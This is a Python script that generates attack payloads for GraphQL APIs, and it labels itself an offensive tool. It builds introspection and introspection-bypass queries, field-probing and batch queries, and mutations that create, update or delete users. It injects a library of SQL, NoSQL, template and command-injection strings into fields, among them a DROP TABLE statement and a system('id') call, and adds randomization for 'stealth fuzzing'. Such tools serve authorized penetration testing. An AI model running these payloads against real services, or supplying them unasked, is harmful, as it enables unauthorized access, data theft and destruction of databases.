#!/usr/bin/env python3
"""
Payload Generator for GraphQL testing (Offensive Edition)
Generates GraphQL queries, mutations, and fuzzing payloads for recon, injection, and introspection.
"""

import json
import random
import string
from typing import List, Dict, Any

class PayloadGenerator:
    def __init__(self):
        self.common_queries = self._load_common_queries()
        self.common_mutations = self._load_common_mutations()
        self.injection_payloads = self._load_injection_payloads()

    # ======================================================
    # 🔹 Common GraphQL Payloads
    # ======================================================
    def _load_common_queries(self) -> List[Dict[str, str]]:
        return [
            {"name": "introspection", "query": "query { __schema { types { name } } }"},
            {"name": "get_users", "query": "query { users { id name email } }"},
            {"name": "get_me", "query": "query { me { id username email role } }"},
            {"name": "get_posts", "query": "query { posts { id title author { id name } } }"},
            {"name": "get_settings", "query": "query { settings { key value } }"}
        ]

    def _load_common_mutations(self) -> List[Dict[str, str]]:
        return [
            {"name": "login", "query": 'mutation { login(input: {email: "test@test.com", password: "password"}) { token user { id } } }'},
            {"name": "create_user", "query": 'mutation { createUser(input: {email: "new@test.com", password: "123456"}) { id } }'},
            {"name": "update_user", "query": 'mutation { updateUser(id: 1, input: {email: "updated@test.com"}) { id } }'},
            {"name": "delete_user", "query": 'mutation { deleteUser(id: 1) { success } }'}
        ]

    # ======================================================
    # 🧪 Injection Payload Library
    # ======================================================
    def _load_injection_payloads(self) -> List[str]:
        """Common injection fuzzing payloads"""
        return [
            "' OR '1'='1",
            '" OR "1"="1',
            'admin" --',
            "'; DROP TABLE users; --",
            '{"$ne": null}',
            '{"$gt": ""}',
            '1;waitfor delay \'0:0:5\'--',
            "${7*7}",
            "' || 'a'=='a",
            '1); system("id"); #'
        ]

    # ======================================================
    # 🎯 Field Suggestion Payloads
    # ======================================================
    def generate_field_suggestion_payloads(self, field_name: str) -> List[Dict[str, str]]:
        """Generate payloads for field suggestion attacks"""
        payloads = []
        common_fields = ["id", "name", "email", "title", "content", "createdAt", "updatedAt"]

        # Basic & extended subfield queries
        for sub_field in common_fields:
            payloads.append({
                "name": f"{field_name}_{sub_field}",
                "query": f"query {{ {field_name} {{ {sub_field} }} }}"
            })

        # Include potential parameterized variant
        payloads.append({
            "name": f"{field_name}_id_param",
            "query": f"query {{ {field_name}(id: 1) {{ id name }} }}"
        })

        return payloads

    # ======================================================
    # 🧩 Introspection Bypass Payloads
    # ======================================================
    def generate_introspection_bypass_payloads(self) -> List[Dict[str, str]]:
        return [
            {"name": "alias_introspection", "query": "query { a: __schema { types { name } } }"},
            {"name": "fragment_introspection", "query": "query { ...Intro } fragment Intro on Query { __schema { types { name } } }"},
            {"name": "inline_fragment", "query": "query { ... on Query { __schema { types { name } } } }"},
            {"name": "json_trick", "query": json.dumps({"query": "query{__schema{types{name}}}"})},  # disguised JSON bypass
        ]

    # ======================================================
    # ⚡ Batch Query Builder
    # ======================================================
    def generate_batch_query_payload(self, queries: List[str]) -> List[Dict[str, Any]]:
        """Generate GraphQL batch query payload"""
        return [
            {"query": q, "variables": {}, "operationName": f"batch_{i}"}
            for i, q in enumerate(queries)
        ]

    # ======================================================
    # 💥 Injection Payload Generator
    # ======================================================
    def generate_injection_tests(self, field: str) -> List[Dict[str, Any]]:
        """Create payloads for injection fuzzing against a specific field"""
        payloads = []
        for inj in self.injection_payloads:
            payloads.append({
                "name": f"{field}_inj_{inj[:5]}",
                "query": f'query {{ {field}(input: "{inj}") {{ id }} }}',
                "type": "injection"
            })
        return payloads

    # ======================================================
    # 🧬 Combined Payload Set
    # ======================================================
    def generate_payload_set(self, field_names: List[str]) -> List[Dict[str, Any]]:
        """Builds a full offensive payload set across all vectors"""
        payloads = []
        for f in field_names:
            payloads += self.generate_field_suggestion_payloads(f)
            payloads += self.generate_injection_tests(f)
        payloads += self.generate_introspection_bypass_payloads()
        return payloads

    # ======================================================
    # 🔢 Utility: Randomizer
    # ======================================================
    def _randstr(self, length=6) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def randomize_variables(self, payload: str) -> str:
        """Injects random test values into payload for stealth fuzzing"""
        return (
            payload.replace("test@test.com", f"{self._randstr()}@mail.com")
                   .replace("password", self._randstr(8))
                   .replace("1", str(random.randint(1, 1000)))
        )

    # ======================================================
    # 📦 Export
    # ======================================================
    def export_payloads(self, payloads: List[Dict[str, Any]], filename: str):
        """Export payloads to JSON for offline use or API consumption"""
        with open(filename, "w") as f:
            json.dump(payloads, f, indent=2)
        print(f"[+] Exported {len(payloads)} payloads → {filename}")


# 🧪 CLI Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python payload_generator.py <field1> <field2> ...")
        sys.exit(1)

    fields = sys.argv[1:]
    gen = PayloadGenerator()
    payloads = gen.generate_payload_set(fields)
    gen.export_payloads(payloads, "graphql_payloads.json")
    print(json.dumps(payloads[:5], indent=2))  # preview first few